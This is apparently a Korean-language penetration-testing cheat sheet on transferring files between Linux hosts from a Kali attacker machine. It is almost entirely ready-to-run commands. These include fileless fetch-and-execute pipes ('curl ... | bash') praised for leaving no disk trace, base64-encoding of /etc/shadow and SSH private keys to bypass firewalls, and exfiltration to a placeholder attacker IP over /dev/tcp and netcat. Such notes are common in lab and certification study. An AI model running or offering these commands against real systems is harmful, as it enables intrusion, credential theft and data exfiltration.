# Linux_to_Linux

# 파일전송 — Linux → Linux

---

## 공격자 측 서버
```bash
# 리스너 IP 확인하는 법
ip a show tun0

```

```bash
python3 -m http.server 80
python3 -m http.server 8080
python -m SimpleHTTPServer 80    # Python2
```

---

## wget

```bash
wget http://<칼리IP>/linpeas.sh -O /tmp/linpeas.sh
wget http://<칼리IP>/exploit.py -P /tmp/
```

---

## curl

```bash
curl http://<칼리IP>/linpeas.sh -o /tmp/linpeas.sh

# 메모리 직접 실행 (디스크 흔적 없음)
curl http://<칼리IP>/linpeas.sh | bash
wget -O - http://<칼리IP>/linpeas.sh | bash
wget -qO - http://<칼리IP>/linpeas.sh | sh
```

---

## SCP (SSH 자격증명 있을 때)

```bash
# 보내기
scp /local/file.txt user@<타겟IP>:/tmp/

# 가져오기
scp user@<타겟IP>:/tmp/loot.txt ./

# 디렉터리 전체
scp -r user@<타겟IP>:/var/www/html/ ./
```

---

## nc (netcat)

```bash
# 받는 쪽
nc -lvnp 4444 > received_file

# 보내는 쪽
nc <받는쪽IP> 4444 < file_to_send

# 전송 확인 (md5)
md5sum file_to_send
```

---

## base64 (방화벽 우회, 소형 파일)

```bash
# 인코딩
base64 -w0 /etc/shadow
cat id_rsa | base64 -w0

# 디코딩
echo "BASE64STRING" | base64 -d > shadow
echo "BASE64STRING" | base64 -d > id_rsa
chmod 600 id_rsa
```
## /dev/tcp (nc / ncat 없을 때)

bash 내장 기능. 타겟에 nc 가 없어도 TCP 로 주고받는다.

```bash
# 공격자가 listen
sudo nc -l -p 443 -q 0 < file_to_send

# 타겟에서 수신 (nc 없이)
cat < /dev/tcp/<칼리IP>/443 > received_file

# 반대로 타겟에서 반출 (공격자: nc -lvnp 443 > out)
cat file > /dev/tcp/<칼리IP>/443
```

## 압축 해제 (unzip 없을 때)

저권한 쉘엔 unzip 이 없는 경우가 많다. 설치 없이 푼다.

```bash
python3 -c "import zipfile; zipfile.ZipFile('file.zip').extractall()"
jar xf file.zip          # JDK 있을 때
# tar 류
tar xf file.tar.gz ; tar xf file.tar.bz2
```

- 파일 하나면 압축을 유지할 이유가 없다. 보내기 전에 미리 풀어서 알맹이만 전송하면 타겟에서 해제 단계를 생략한다

## 코드 원라이너 다운로드 (wget/curl 없을 때)

```bash
# python
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<칼리IP>/f","f")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://<칼리IP>/f","f")'

# php / ruby / perl
php  -r '$f=file_get_contents("http://<칼리IP>/f");file_put_contents("f",$f);'
ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI("http://<칼리IP>/f")))'
perl -e 'use LWP::Simple;getstore("http://<칼리IP>/f","f");'
```

---

## 쓰기 가능한 경로

```bash
/tmp
/var/tmp
/dev/shm
/run/shm
```
